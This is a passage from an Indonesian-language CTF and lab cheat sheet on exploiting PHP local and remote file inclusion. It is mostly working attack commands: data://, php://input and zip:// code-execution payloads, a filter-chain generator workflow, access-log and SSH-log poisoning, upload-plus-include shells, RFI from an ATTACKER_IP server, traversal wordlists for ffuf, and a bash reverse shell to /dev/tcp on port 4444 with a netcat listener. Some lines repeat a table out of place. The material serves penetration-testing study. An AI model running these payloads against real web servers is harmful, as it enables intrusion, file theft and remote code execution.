Karakter khusus sebaiknya di-encode.

curl:

```bash
curl -G \
  'http://10.10.10.10/index.php' \
  --data-urlencode "page=data://text/plain,<?php system('id'); ?>"
```

---

## Base64 Variant

Payload PHP:

```php
<?php system('id'); ?>
```

Encode lokal:

```bash
printf '%s' "<?php system('id'); ?>" | base64 -w 0
```

Contoh hasil:

```text
PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

Kemudian:

```text
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

curl:

```bash
curl -G \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=='
```

---

## `php://input` vs `data://`

||`php://input`|`data://`|
|---|---|---|
|Payload location|POST body|URL parameter|
|Encoding|Raw body|Plain/base64|
|Request method|POST biasanya|GET/POST|
|Configuration-sensitive|Ya|Ya|
|Cocok untuk|LFI lab|LFI lab|
|Source disclosure|Tidak fokus|Tidak fokus|
|RCE|Bisa|Bisa|

---

# 4.5 `expect://`

### 📌 Kapan Digunakan

Gunakan hanya sebagai **secondary check** ketika PHP extension `expect` tersedia.

---

## Payload

```text
expect://id
```

Contoh:

```bash
curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode 'page=expect://id'
```

Jika extension tersedia dan konfigurasi cocok, command output dapat muncul.

---

## Kenapa Jarang?

Karena:

```text
expect extension
```

bukan default pada sebagian besar PHP deployment modern.

Gunakan urutan:

```text
php://filter
↓
php://input
↓
data://
↓
expect://
```

bukan langsung berharap `expect://` bekerja.

---

# 4.6 `zip://` dan `phar://`

### 📌 Kapan Digunakan

Gunakan ketika terdapat **file upload + LFI** dan uploaded file tidak dapat dieksekusi langsung.

---

## `zip://`

Konsep:

```text
Upload archive
      |
      v
shell.zip
  └── shell.php
      |
      v
LFI include:
zip://shell.zip#shell.php
```

---

## Membuat ZIP di Parrot OS

Buat file:

```bash
cat > shell.php <<'PHP'
<?php echo "ZIP_LFI_OK"; ?>
PHP
```

Lalu:

```bash
zip shell.zip shell.php
```

Output:

```text
adding: shell.php (stored 0%)
```

Upload:

```bash
curl -s \
  -F 'file=@shell.zip' \
  'http://10.10.10.10/upload'
```

Misalnya file tersimpan:

```text
/tmp/uploads/shell.zip
```

Lalu test:

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=zip:///tmp/uploads/shell.zip#shell.php'
```

Expected:

```text
ZIP_LFI_OK
```

---

## RCE Validation

Untuk lab:

```php
<?php system('id'); ?>
```

kemudian archive:

```bash
zip shell.zip shell.php
```

dan include:

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=zip:///tmp/uploads/shell.zip#shell.php'
```

Expected:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## `phar://`

### Konsep

`phar://` digunakan untuk mengakses data di dalam Phar archive.

Dalam CTF, hal ini dapat muncul bersama:

```text
upload
LFI
file parsing
PHP object behavior
```

Contoh path:

```text
phar:///tmp/uploads/archive.phar/file.php
```

Behavior sangat bergantung pada bagaimana PHP dan aplikasi mengakses archive.

---

## Penting

Jangan menyamakan:

```text
zip://
```

dan:

```text
phar://
```

Keduanya adalah wrapper berbeda dengan semantics berbeda.

---

# 4.7 Wrapper Summary

|Wrapper|Fungsi|Kapan Pakai|Syarat|
|---|---|---|---|
|`php://filter`|Source disclosure|PHP LFI|`php://` tersedia|
|`php://input`|Read POST body as stream|LFI → code execution|Include behavior + config cocok|
|`data://`|Inline data|LFI → code execution|Wrapper/config mendukung|
|`phar://`|Access Phar resources|Upload/archive chains|Phar behavior + application context|
|`file://`|Local file access|Explicit wrapper testing|Local filesystem|

---

# 4.8 PHP Filter Chain Generator

### 📌 Kapan Digunakan

Gunakan ketika:

```text
LFI confirmed di PHP
+
Tidak ada file yang bisa dimanfaatkan untuk log poisoning atau upload
+
php://input tidak tersedia atau diblock
+
Butuh arbitrary PHP execution
```

**Ini adalah teknik MODERN yang sangat sering muncul di CTF HackTheBox dan PortSwigger labs sejak 2022.**

---

## Konsep

Teknik ini menggunakan **chain dari iconv filter** untuk generate arbitrary byte sequence. Ketika di-include oleh PHP, byte sequence ini menghasilkan valid PHP code yang akan dieksekusi.

### Bagaimana Cara Kerjanya

1. **Chaining filters:** PHP `php://filter` bisa di-chain dengan `|` (pipe)
2. **iconv conversion:** Setiap konversi encoding bisa mengubah byte tertentu
3. **Byte manipulation:** Dengan chain yang panjang dan tepat, kita bisa craft arbitrary bytes
4. **Result:** Output akhir adalah valid PHP code seperti `<?php system('id'); ?>`

### Keunggulan

```text
✅ Tidak butuh file upload
✅ Tidak butuh log poisoning  
✅ Tidak butuh external server
✅ Tidak butuh php://input
✅ Cukup: LFI + PHP application
✅ Bypass banyak filter/WAF
```

---

## Tool: PHP Filter Chain Generator

```bash
# Clone repository
git clone https://github.com/synacktiv/php_filter_chain_generator
cd php_filter_chain_generator

# Generate chain untuk payload sederhana
python3 php_filter_chain_generator.py \
  --chain '<?php echo "FILTER_CHAIN_OK"; ?>'
```

### Output Example

Tool akan generate chain yang sangat panjang seperti:

```text
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|
convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|
convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|
... (ratusan filter lainnya) ...
/resource=data:text/plain,
```

---

## Workflow: LFI to RCE via Filter Chain

### Step 1: Generate Chain untuk Command Execution

```bash
# Payload: execute 'id' command
python3 php_filter_chain_generator.py \
  --chain '<?php system("id"); ?>' \
  > payload.txt

# Lihat payload
cat payload.txt
```

### Step 2: Gunakan Chain dengan LFI

```bash
# Extract chain dari file
CHAIN=$(cat payload.txt | tail -1)

# Test dengan curl
curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode "page=$CHAIN"
```

### Expected Output

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Contoh: Reverse Shell via Filter Chain

### Generate Payload

```bash
# Reverse shell payload (ganti IP dan PORT)
python3 php_filter_chain_generator.py \
  --chain '<?php system("bash -c \"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\""); ?>' \
  > revshell_chain.txt
```

### Setup Listener

```bash
# Terminal 1: listener
nc -lvnp 4444
```

### Trigger RCE

```bash
# Terminal 2: exploit
CHAIN=$(cat revshell_chain.txt | tail -1)

curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode "page=$CHAIN"
```

---

## Tips & Troubleshooting

### Payload Terlalu Panjang

Jika payload chain terlalu panjang untuk URL, gunakan POST:

```bash
CHAIN=$(cat payload.txt | tail -1)

curl -s 'http://10.10.10.10/index.php' \
  -X POST \
  --data-urlencode "page=$CHAIN"
```

### Encoding Issues

Jika ada masalah dengan special characters:

```bash
# URL encode manual
CHAIN=$(cat payload.txt | tail -1 | jq -sRr @uri)

curl -sG "http://10.10.10.10/index.php?page=$CHAIN"
```

### Testing Sederhana

Test dengan payload simpel dulu:

```bash
# Echo string sederhana
python3 php_filter_chain_generator.py \
  --chain '<?php echo "PWNED"; ?>'
```

---

## Kenapa Teknik Ini Powerful?

### Bypass Multiple Protections

```text
✅ Bypass file upload restrictions (tidak butuh upload)
✅ Bypass allow_url_include=Off (tidak butuh RFI)
✅ Bypass php://input restrictions
✅ Bypass log file permission/location issues
✅ Works on default PHP configuration
```

### Real CTF Usage

**Teknik ini SANGAT POPULER di:**
- HackTheBox machines (2022-2024)
- PortSwigger Web Security Academy labs
- CTF challenges modern

**Contoh machine HTB yang pakai:**
- Pollution (2023)
- Encoding (2023)
- Precious (2022)

---

## Muscle Memory

```bash
# Download tool (once)
git clone https://github.com/synacktiv/php_filter_chain_generator

# Generate chain
python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'

# Copy chain, test dengan LFI
curl -sG 'http://target/index.php' --data-urlencode "page=[PASTE_CHAIN]"

# Jika berhasil → craft reverse shell
python3 php_filter_chain_generator.py \
  --chain '<?php system("bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\""); ?>'
```

---

## References

- [PHP Filter Chain Generator - synacktiv GitHub](https://github.com/synacktiv/php_filter_chain_generator)
- [Blog Post: PHP filter chains - Charles Fol](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle.html)
- [PayloadsAllTheThings - LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi-to-rce-via-php-filters)
|`phar://`|Access Phar resources|Upload/archive chains|Phar behavior + application context|
|`file://`|Local file access|Explicit wrapper testing|Local filesystem|

---

# Bagian 5 — Log Poisoning

# 5.1 Konsep Log Poisoning

### 📌 Kapan Digunakan

Gunakan ketika:

```text
LFI confirmed
+
tidak ada direct wrapper RCE
+
attacker-controlled data dapat masuk ke file log
```

---

## Diagram

```text
        ATTACKER
           |
           | malicious header
           v
     Web Server
           |
           v
     access.log
           |
           | LFI
           v
     include(access.log)
           |
           v
      PHP Parser
           |
           v
     Code Execution
```

---

## Syarat

Harus ada:

```text
1. LFI
2. Log file readable
3. Attacker can influence log content
4. Included content is interpreted as PHP
5. Web process can reach relevant log
```

Kalau hanya:

```text
log readable
```

belum berarti RCE.

---

# 5.2 Apache/Nginx Access Log Poisoning

### 📌 Kapan Digunakan

Gunakan pada Linux web server ketika access log dapat dibaca melalui LFI.

---

## Step 1 — Tentukan Log

Apache:

```text
/var/log/apache2/access.log
```

Nginx:

```text
/var/log/nginx/access.log
```

---

## Step 2 — Inject Header

Untuk lab, gunakan payload sederhana:

```php
<?php echo "LOG_POISON_OK"; ?>
```

Kirim sebagai User-Agent:

```bash
curl -s \
  -A '<?php echo "LOG_POISON_OK"; ?>' \
  'http://10.10.10.10/'
```

Server dapat mencatat:

```text
"GET / HTTP/1.1" 200 ...
"<?php echo "LOG_POISON_OK"; ?>"
```

---

## Step 3 — Include Log

Apache:

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=/var/log/apache2/access.log'
```

Expected:

```text
LOG_POISON_OK
```

Itu membuktikan:

```text
LFI
+
attacker-controlled log
+
PHP interpretation
```

---

## RCE Validation di Lab

Gunakan:

```php
<?php echo shell_exec('id'); ?>
```

Inject:

```bash
curl -s \
  -A "<?php echo shell_exec('id'); ?>" \
  'http://10.10.10.10/'
```

Trigger:

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=/var/log/apache2/access.log'
```

Contoh:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Jika Tidak Bekerja

Kemungkinan:

```text
log tidak writable/readable
log format escapes PHP markers
application memakai custom log
PHP tidak memproses log content
WAF/filter mengubah header
target memakai Nginx + PHP-FPM dengan path berbeda
```

---

# 5.3 SSH Log Poisoning

### 📌 Kapan Digunakan

Gunakan hanya pada CTF/lab ketika:

```text
LFI
+
/var/log/auth.log readable
+
SSH service accessible
+
username/input memengaruhi log
```

---

## Konsep

```text
SSH connection
    |
    v
auth.log
    |
    v
LFI
    |
    v
PHP parser
```

---

## Caveat Penting

SSH log behavior sangat tergantung:

```text
OpenSSH version
PAM
syslog/journald
log configuration
message format
```

Jadi teknik klasik dapat berbeda antar target.

---

## Detection

Baca terlebih dahulu:

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=/var/log/auth.log'
```

Cari:

```text
Failed password
Invalid user
Accepted password
sshd
```

---

## Lab Injection Concept

Payload log marker:

```text
<?php echo "SSH_LOG_OK"; ?>
```

Contoh koneksi yang sengaja menghasilkan log entry:

```bash
ssh '<?php echo "SSH_LOG_OK"; ?>'@10.10.10.10
```

Pada beberapa OpenSSH configurations, karakter atau username tersebut dapat ditolak sebelum tercatat. Karena itu langkah ini sangat target-specific.

Kemudian:

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=/var/log/auth.log'
```

---

# 5.4 Mail Log Poisoning

### 📌 Kapan Digunakan

Gunakan ketika server menjalankan mail service dan attacker-controlled input masuk ke mail logs yang kemudian dapat dibaca via LFI.

---

## Potensi Log

Contoh:

```text
/var/log/mail.log
/var/log/maillog
```

---

## Konsep

```text
SMTP-controlled field
        |
        v
mail log
        |
        v
LFI
        |
        v
PHP interpretation
```

---

## Detection

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=/var/log/mail.log'
```

Cari:

```text
postfix
sendmail
smtp
client=
```

Untuk challenge, gunakan SMTP service yang memang disediakan target dan jangan mengirim spam ke sistem di luar lab.

---

# 5.5 `/proc/self/environ` Poisoning

### 📌 Kapan Digunakan

Gunakan ketika:

```text
/proc/self/environ readable
+
request header memengaruhi process environment
```

---

## Concept

```text
HTTP header
     |
     v
process environment
     |
     v
/proc/self/environ
     |
     v
LFI
```

---

## Caution

`/proc/self/environ` merepresentasikan environment process yang sedang melayani request. Header **tidak otomatis** menjadi environment variable.

Jadi harus ada framework/server behavior yang memang memindahkan data tersebut ke environment.

---

## Safe Marker Test

Header:

```bash
curl -s \
  -H 'X-LFI-Test: PROC_ENV_OK' \
  'http://10.10.10.10/'
```

Kemudian:

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=/proc/self/environ'
```

Cari:

```text
PROC_ENV_OK
```

Jika tidak muncul:

```text
header ≠ environment
```

dan teknik ini tidak applicable pada target tersebut.

---

# Bagian 6 — LFI to RCE Paths

# 6.1 Decision Tree: LFI → RCE

### 📌 Kapan Digunakan

Gunakan setelah LFI confirmed untuk memilih jalur escalation paling realistis.

```text
                         LFI CONFIRMED
                              |
              +---------------+---------------+
              |               |               |
              v               v               v
      PHP WRAPPERS?       UPLOAD?           LOGS?
              |               |               |
          +---+---+           |          +----+----+
          |       |           |          |    |    |
          v       v           v          v    v    v
      filter   input/data   PHP file   Apache SSH Mail
          |       |           |          |    |    |
          v       v           v          +----+----+
       Source     RCE        LFI               |
       Code        |         Include           v
          |        |           |          Log Poison
          v        |           |               |
     Secret/Path   |           |               v
          |        +-----------+-----------> RCE
          |                    |
          v                    v
       Find new             validate
       primitive              id
                                |
                                v
                              RCE

                 ALSO CHECK

                     LFI
                       |
                       v
              /proc/self/environ
                       |
               +-------+-------+
               |               |
              read         writable/influenced
               |               |
              info             v
                             LFI →
                           PHP parse?
```

---

## Branch 1 — `php://filter`

```text
LFI
 ↓
php://filter
 ↓
Source code
 ↓
Secrets / paths / hidden endpoints
 ↓
New attack surface
```

---

## Branch 2 — `php://input`

```text
LFI
 ↓
php://input
 ↓
POST body
 ↓
PHP parser
 ↓
id
```

---

## Branch 3 — `data://`

```text
LFI
 ↓
data://
 ↓
inline PHP
 ↓
PHP parser
 ↓
id
```

---

## Branch 4 — Upload

```text
LFI
 ↓
Upload functionality
 ↓
Upload PHP-containing file
 ↓
Predict path
 ↓
Include via LFI
 ↓
PHP execution
```

---

## Branch 5 — Logs

```text
LFI
 ↓
Readable log
 ↓
Attacker-controlled log entry
 ↓
Include log
 ↓
PHP parsing
 ↓
RCE
```

---

## Branch 6 — `/proc`

```text
LFI
 ↓
/proc/self/*
 ↓
Process information
 ↓
Environment / command line
 ↓
Credentials or new paths
```

---

# 6.2 Upload + LFI Combo

### 📌 Kapan Digunakan

Gunakan ketika:

```text
file upload exists
+
uploaded file is stored somewhere
+
direct execution blocked
+
LFI exists
```

---

## Step 1 — Create Safe PHP Marker

```bash
cat > shell.php <<'PHP'
<?php echo "UPLOAD_LFI_OK"; ?>
PHP
```

---

## Step 2 — Upload

Misal:

```text
POST /upload
```

curl:

```bash
curl -s \
  -F 'file=@shell.php' \
  'http://10.10.10.10/upload'
```

Cari response:

```text
/uploads/shell.php
```

atau:

```text
/tmp/php12345
```

---

## Step 3 — Predict Path

Common candidates:

```text
/uploads/shell.php
/upload/shell.php
/files/shell.php
/media/shell.php
/static/uploads/shell.php
/tmp/phpXXXXXX
```

Jangan menganggap semuanya benar.

Gunakan:

```text
response
HTML source
download endpoint
application code
directory listing
errors
```

---

## Step 4 — Include

Misalnya:

```text
/uploads/shell.php
```

curl:

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=/var/www/html/uploads/shell.php'
```

Expected:

```text
UPLOAD_LFI_OK
```

---

## Step 5 — RCE Validation

Ganti content menjadi:

```php
<?php echo shell_exec('id'); ?>
```

Upload:

```bash
curl -s \
  -F 'file=@shell.php' \
  'http://10.10.10.10/upload'
```

Include kembali:

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=/var/www/html/uploads/shell.php'
```

Expected:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

# Bagian 7 — Remote File Inclusion (RFI)

# 7.1 RFI Fundamentals

### 📌 Kapan Digunakan

Gunakan ketika target adalah PHP dan ada indikasi **remote URL dapat di-include**.

---

## LFI vs RFI

||LFI|RFI|
|---|---|---|
|Resource|Local|Remote|
|Example|`/etc/passwd`|`http://ATTACKER/shell.php`|
|Commonness|Tinggi|Lebih jarang|
|Typical PHP requirement|Local inclusion vulnerability|Remote include functionality|
|Potential impact|File read/RCE|Sangat dekat ke direct RCE|

---

## `allow_url_include`

Konfigurasi PHP yang perlu diperhatikan:

```text
allow_url_include
```

Untuk classic PHP remote inclusion, biasanya harus:

```text
On
```

Dan URL-aware file handling harus tersedia.

Namun jangan hanya mengandalkan `php.ini` karena framework/application dapat menambahkan behavior sendiri.

---

## Cara Mengecek

Jika berhasil membaca:

```text
phpinfo()
```

atau source:

```text
php.ini
```

cari:

```text
allow_url_include
```

Jangan berasumsi bahwa:

```text
LFI
```

berarti:

```text
RFI
```

---

# 7.2 Basic RFI

### 📌 Kapan Digunakan

Gunakan ketika remote URL inclusion memang mungkin.

---

## Step 1 — Create Controlled File

Di Parrot OS:

```bash
mkdir -p ~/lfi-rfi-lab
cd ~/lfi-rfi-lab
```

Buat:

```bash
cat > test.txt <<'EOF'
RFI_TEST_OK
EOF
```

---

## Step 2 — Start HTTP Server

```bash
python3 -m http.server 8000 --bind 0.0.0.0
```

Contoh output:

```text
Serving HTTP on 0.0.0.0 port 8000
```

---

## Step 3 — Verify Locally

```bash
curl -s http://127.0.0.1:8000/test.txt
```

Expected:

```text
RFI_TEST_OK
```

---

## Step 4 — Verify Target Can Reach Attacker

Masukkan:

```text
http://ATTACKER_IP:8000/test.txt
```

ke dalam parameter:

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=http://ATTACKER_IP:8000/test.txt'
```

Jika target mengambil file, terminal Python akan menunjukkan:

```text
10.10.10.10 - - [date] "GET /test.txt HTTP/1.1" 200 -
```

dan target mungkin menunjukkan:

```text
RFI_TEST_OK
```

---

## Step 5 — RFI PHP Lab

Buat:

```bash
cat > rfi-test.php <<'PHP'
<?php echo "RFI_PHP_OK"; ?>
PHP
```

Server:

```bash
python3 -m http.server 8000 --bind 0.0.0.0
```

Test:

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=http://ATTACKER_IP:8000/rfi-test.php'
```

Jika PHP remote inclusion benar-benar aktif:

```text
RFI_PHP_OK
```

---

## RCE Validation pada Lab

```php
<?php echo shell_exec('id'); ?>
```

simpan sebagai `rfi-test.php`.

Target:

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=http://ATTACKER_IP:8000/rfi-test.php'
```

Expected:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

# 7.3 RFI via SMB

### 📌 Kapan Digunakan

Gunakan terutama ketika target adalah **Windows** dan aplikasi/OS dapat mengakses UNC paths.

---

## Konsep

```text
Windows Target
      |
      | SMB
      v
\\ATTACKER\share\shell.php
```

Ini bukan jalur RFI klasik HTTP. Ini bergantung pada:

```text
Windows filesystem semantics
SMB client
PHP/application path handling
UNC path support
```

---

## Setup Impacket SMB Server

Di Parrot OS:

```bash
mkdir -p ~/smb-share
```

Buat file:

```bash
cat > ~/smb-share/test.php <<'PHP'
<?php echo "SMB_LFI_OK"; ?>
PHP
```

Start server:

```bash
impacket-smbserver share ~/smb-share -smb2support
```

---

## UNC Path

Target:

```text
\\ATTACKER_IP\share\test.php
```

Dalam URL encoding:

```text
%5C%5CATTACKER_IP%5Cshare%5Ctest.php
```

---

## Test

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=\\ATTACKER_IP\share\test.php'
```

Jika target mencoba mengakses share, terminal SMB server dapat menunjukkan connection/request.

---

## Catatan Penting

Pada Linux target:

```text
\\ATTACKER\share
```

bukan cara normal untuk mengambil file remote via SMB menggunakan PHP include.

Gunakan technique ini terutama untuk:

```text
Windows
IIS
XAMPP
UNC-capable application
```

---

# 7.4 RFI Filter Bypass

### 📌 Kapan Digunakan

Gunakan ketika RFI sudah terbukti secara konsep tetapi URL atau karakter tertentu difilter.

---

## URL Encoding

Contoh:

```text
http://
```

dapat dipresentasikan:

```text
http%3A%2F%2F
```

Test:

```bash
curl 'http://10.10.10.10/index.php?page=http%3A%2F%2FATTACKER_IP%3A8000%2Ftest.txt'
```

---

## Double Encoding

Contoh:

```text
%253A
%252F
```

hanya berguna jika target memiliki:

```text
decode → filter → decode
```

atau urutan sejenis.

---

## Null Byte Legacy

Payload klasik:

```text
http://ATTACKER/shell.php%00
```

Tetapi seperti traversal null byte:

```text
PHP modern
```

umumnya tidak rentan terhadap classic null-byte termination.

Gunakan hanya untuk memahami old challenge:

```text
? PHP < 5.3.4
```

---

# Bagian 8 — Tools & Automation

# 8.1 Manual Testing dengan curl

### 📌 Kapan Digunakan

Gunakan `curl` untuk setiap tahap saat kamu ingin mengetahui **tepat request apa yang memicu behavior**.

---

## GET

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=../../../../etc/passwd'
```

---

## POST

```bash
curl -s \
  -X POST \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=../../../../etc/passwd'
```

---

## Cookie

```bash
curl -s \
  'http://10.10.10.10/' \
  -H 'Cookie: lang=../../../../etc/passwd'
```

---

## Header

```bash
curl -s \
  'http://10.10.10.10/' \
  -H 'User-Agent: ../../../../etc/passwd'
```

---

## Source Disclosure

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php'
```

---

# 8.2 ffuf untuk LFI

### 📌 Kapan Digunakan

Gunakan ketika ingin menguji banyak traversal payload secara otomatis setelah parameter vulnerable sudah ditemukan.

---

## Wordlist

Buat file:

```bash
cat > lfi-payloads.txt <<'EOF'
../../../../etc/passwd
../../../../../etc/passwd
../../../etc/passwd
../../../../etc/hosts
../../../../etc/hostname
../../../../proc/self/environ
../../../../proc/self/cmdline
../../../../var/log/apache2/access.log
../../../../var/log/nginx/access.log
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd
/etc/passwd
EOF
```

---

## Fuzzing

Contoh:

```bash
ffuf \
  -u 'http://10.10.10.10/index.php?page=FUZZ' \
  -w lfi-payloads.txt \
  -mc all
```

---

## Filter by Response Size

Misalnya baseline:

```text
Length = 4120
```

Maka:

```bash
ffuf \
  -u 'http://10.10.10.10/index.php?page=FUZZ' \
  -w lfi-payloads.txt \
  -fs 4120
```

---

## Apa yang Dicari?

Prioritas:

```text
status
size
words
lines
known marker
```

Contoh:

```text
../../../../etc/passwd
[Status: 200, Size: 7210]

../../../../etc/hosts
[Status: 200, Size: 4380]

../../../nothing
[Status: 200, Size: 4120]
```

Interpretasi:

```text
different response size
```

adalah signal.

Belum otomatis proof.

---

# 8.3 LFISuite / LFImap

### 📌 Kapan Digunakan

Gunakan untuk automation setelah manual testing dasar dipahami.

---

## LFISuite

Install dalam virtual environment bila tool/dependency memungkinkan:

```bash
git clone <tool-repository-for-lab-use>
cd LFISuite
python3 -m venv .venv
source .venv/bin/activate
```

Karena project tooling dan dependency dapat berubah, gunakan repository/branch yang kamu gunakan di lab sebagai source of truth.

Basic concept:

```text
URL
 ↓
Parameter discovery
 ↓
LFI detection
 ↓
Traversal testing
 ↓
Wrapper testing
```

---

## LFImap

Workflow serupa:

```text
Target
 ↓
Injection point
 ↓
Traversal
 ↓
Known file
 ↓
Wrapper
 ↓
Potential escalation
```

---

## Jangan Bergantung pada Tool

Tool dapat:

```text
miss custom filters
miss WAF
misidentify OS
produce false positive
```

Manual confirmation tetap wajib.

---

# 8.4 Script `lfi_detect.sh`

### 📌 Kapan Digunakan

Gunakan sebagai scanner ringan untuk:

```text
basic LFI
encoded traversal
PHP filter
known sensitive file
```

Script ini **tidak melakukan RCE otomatis**.

---

## Script

```bash
#!/usr/bin/env bash

set -uo pipefail

usage() {
    cat <<'EOF'
Usage:
  ./lfi_detect.sh <URL> <PARAMETER>

Example:
  ./lfi_detect.sh 'http://10.10.10.10/index.php' 'page'

The script tests:
  - /etc/passwd
  - /etc/hosts
  - encoded traversal
  - php://filter source disclosure
EOF
}

if [[ $# -ne 2 ]]; then
    echo "[!] Invalid argument count." >&2
    usage
    exit 1
fi

URL="$1"
PARAM="$2"

# URL: basic HTTP/HTTPS validation
if [[ ! "$URL" =~ ^https?://[^[:space:]]+$ ]]; then
    echo "[!] Invalid URL." >&2
    exit 1
fi

# Parameter validation
if [[ ! "$PARAM" =~ ^[A-Za-z0-9_.\[\]-]+$ ]]; then
    echo "[!] Invalid parameter name." >&2
    exit 1
fi

# Require curl
if ! command -v curl >/dev/null 2>&1; then
    echo "[!] curl is not installed." >&2
    exit 1
fi

# Temporary files
TMPDIR="$(mktemp -d)"
trap 'rm -rf "$TMPDIR"' EXIT

# -------------------------------------------------
# Request function
# -------------------------------------------------

request_payload() {
    local payload="$1"
    local outfile="$2"

    curl \
        --silent \
        --show-error \
        --max-time 10 \
        --get \
        --data-urlencode "${PARAM}=${payload}" \
        "$URL" \
        >"$outfile" 2>"$TMPDIR/curl.err"

    return $?
}

# -------------------------------------------------
# Marker detection
# -------------------------------------------------

report_lfi() {
    local payload="$1"
    local outfile="$2"

    if grep -Eq \
        '(^|[^A-Za-z0-9_])(root):x:0:0:|127\.0\.0\.1|localhost|Linux|APP_ENV=|PATH=' \
        "$outfile"; then

        echo "[+] POSSIBLE LFI DETECTED"
        echo "    Payload : $payload"
        echo "    Evidence: known file/environment marker"
        return 0
    fi

    return 1
}

# -------------------------------------------------
# Header / status baseline
# -------------------------------------------------

echo "=============================================="
echo " LFI Detection Scanner"
echo "=============================================="
echo "[+] URL       : $URL"
echo "[+] Parameter : $PARAM"
echo

# -------------------------------------------------
# Payload set
# -------------------------------------------------

PAYLOADS=(
    '../../../../etc/passwd'
    '../../../../../etc/passwd'
    '../../../../etc/hosts'
    '../../../../etc/hostname'
    '../../../../proc/self/environ'
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
    '%252e%252e%252f%252e%252e%252fetc%252fpasswd'
    '/etc/passwd'
    'php://filter/convert.base64-encode/resource=index.php'
)

for payload in "${PAYLOADS[@]}"; do

    OUTFILE="$TMPDIR/response"

    echo
    echo "[-] Testing:"
    echo "    $payload"

    if ! request_payload "$payload" "$OUTFILE"; then
        echo "    [!] HTTP request failed"
        cat "$TMPDIR/curl.err" >&2
        continue
    fi

    SIZE="$(wc -c < "$OUTFILE")"

    echo "    Response size: $SIZE bytes"

    if report_lfi "$payload" "$OUTFILE"; then
        echo "    Response sample:"
        head -c 220 "$OUTFILE" | tr '\n' ' '
        echo
        continue
    fi

    # -------------------------------------------------
    # Base64/source disclosure heuristic
    # -------------------------------------------------

    if [[ "$payload" == php://filter/* ]]; then
        if grep -Eq \
            '[A-Za-z0-9+/]{80,}={0,2}' \
            "$OUTFILE"; then

            echo "    [+] POSSIBLE PHP SOURCE DISCLOSURE"
            echo "        php://filter returned base64-like content"
        fi
    fi

    echo "    [-] No strong LFI marker detected"
done

echo
echo "=============================================="
echo " Scan complete"
echo "=============================================="
echo "[!] Results are heuristic."
echo "[!] Confirm manually with Repeater/curl."
```

---

## Permission

```bash
chmod +x lfi_detect.sh
```

---

## Run

```bash
./lfi_detect.sh \
  'http://10.10.10.10/index.php' \
  'page'
```

---

## Contoh Output Realistis

```text
==============================================
 LFI Detection Scanner
==============================================
[+] URL       : http://10.10.10.10/index.php
[+] Parameter : page


[-] Testing:
    ../../../../etc/passwd
    Response size: 7211 bytes
    [+] POSSIBLE LFI DETECTED
        Payload : ../../../../etc/passwd
        Evidence: known file/environment marker
    Response sample:
    root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin ...

[-] Testing:
    ../../../../../etc/passwd
    Response size: 7211 bytes
    [+] POSSIBLE LFI DETECTED

[-] Testing:
    ../../../../etc/hosts
    Response size: 4384 bytes
    [+] POSSIBLE LFI DETECTED

[-] Testing:
    ../../../../proc/self/environ
    Response size: 8902 bytes
    [+] POSSIBLE LFI DETECTED

[-] Testing:
    %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
    Response size: 7211 bytes
    [+] POSSIBLE LFI DETECTED

[-] Testing:
    php://filter/convert.base64-encode/resource=index.php
    Response size: 6034 bytes
    [+] POSSIBLE PHP SOURCE DISCLOSURE
        php://filter returned base64-like content

==============================================
 Scan complete
==============================================
[!] Results are heuristic.
[!] Confirm manually with Repeater/curl.
```

---

# 8.5 LFI di Non-PHP Context

### ⚠️ Catatan Penting

Dokumen ini **fokus ke PHP** karena PHP adalah yang paling sering muncul di CTF dengan LFI vulnerability. **TAPI**, LFI bukan eksklusif PHP!

### Platform Lain yang Bisa Vulnerable

**LFI juga bisa terjadi di:**

#### 1. Python (Flask/Django)

```python
# Vulnerable code
@app.route('/read')
